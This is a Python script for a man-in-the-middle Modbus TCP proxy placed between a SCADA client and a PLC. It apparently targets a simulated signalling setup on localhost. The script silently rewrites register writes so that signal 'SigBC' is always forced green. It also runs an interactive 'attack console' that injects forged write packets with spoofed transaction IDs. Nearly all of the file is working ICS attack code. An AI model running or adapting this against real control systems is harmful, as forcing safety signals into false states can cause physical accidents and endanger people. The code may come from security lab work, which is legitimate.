#!/usr/bin/env python3
import asyncio
import struct
import sys
from scapy.all import Raw

# --- CONFIGURATION ---
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 5021
PLC_HOST = "127.0.0.1"
PLC_PORT = 5020
UNIT_ID = 1
SIG_BC_HR_ADDR = 1 

# Global state to track the last seen Transaction ID to stay in sync with the PLC
latest_transaction_id = 0

def process_modbus_payload(data):
    """Parses and modifies background traffic (Automatic Hijacking)."""
    global latest_transaction_id
    view = memoryview(data)
    offset = 0
    output = bytearray()

    while offset <= len(view) - 7:
        tid, pid, length, unit = struct.unpack_from(">HHHB", view, offset)
        latest_transaction_id = tid # Keep track of the current sequence
        total_frame_len = 6 + length
        frame = bytearray(view[offset : offset + total_frame_len])
        pdu = frame[7:]
        
        # Modification: If background traffic tries to write SigBC, force it to 1
        func_code = pdu[0]
        if func_code == 16: # Write Multiple
            start_addr, qty = struct.unpack_from(">HH", pdu, 1)
            if start_addr <= SIG_BC_HR_ADDR < (start_addr + qty):
                val_offset = 6 + (SIG_BC_HR_ADDR - start_addr) * 2
                pdu[val_offset] = 0x00
                pdu[val_offset+1] = 0x01
                frame[7:] = pdu

        output.extend(frame)
        offset += total_frame_len
    return bytes(output)

async def manual_console_trigger(writer):
    """Console loop to send manual overrides on key press."""
    global latest_transaction_id
    print("\n--- ATTACK CONSOLE ---")
    print("Commands: [g] Force SigBC Green, [r] Force SigBC Red, [q] Quit")
    
    loop = asyncio.get_event_loop()
    while True:
        # Get input without blocking the proxy tasks
        cmd = await loop.run_in_executor(None, sys.stdin.readline)
        cmd = cmd.strip().lower()

        if not cmd: continue
        
        val = None
        if cmd == 'g': val = 1
        elif cmd == 'r': val = 0
        elif cmd == 'q': break

        if val is not None:
            # Construct a Manual Write Single Register (FC6) packet
            # Use a high TID offset to avoid collision with game traffic
            tid = (latest_transaction_id + 1) % 65535
            # MBAP (7 bytes) + PDU (5 bytes)
            # Length is 6 bytes (UnitID + PDU)
            manual_packet = struct.pack(">HHHBBHH", tid, 0, 6, UNIT_ID, 6, SIG_BC_HR_ADDR, val)
            
            writer.write(manual_packet)
            await writer.drain()
            state = "GREEN" if val == 1 else "RED"
            print(f"[!] MANUAL OVERRIDE: Sent SigBC -> {state} (TID: {tid})")

async def pipe(reader, writer, should_modify):
    try:
        while True:
            data = await reader.read(4096)
            if not data: break
            if should_modify:
                data = process_modbus_payload(data)
            writer.write(data)
            await writer.drain()
    except Exception: pass
    finally: writer.close()

async def handle_client(c_reader, c_writer):
    try:
        s_reader, s_writer = await asyncio.open_connection(PLC_HOST, PLC_PORT)
        
        # Launch the proxy pipes AND the manual console trigger
        # We pass s_writer to the console so it can inject packets directly to the PLC
        await asyncio.gather(
            pipe(c_reader, s_writer, True),
            pipe(s_reader, c_writer, False),
            manual_console_trigger(s_writer)
        )
    except Exception as e:
        print(f"Connection error: {e}")

async def main():
    server = await asyncio.start_server(handle_client, LISTEN_HOST, LISTEN_PORT)
    print(f"Gateway Running. Connect Pygame/SCADA to Port {LISTEN_PORT}")
    async with server:
        await server.serve_forever()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
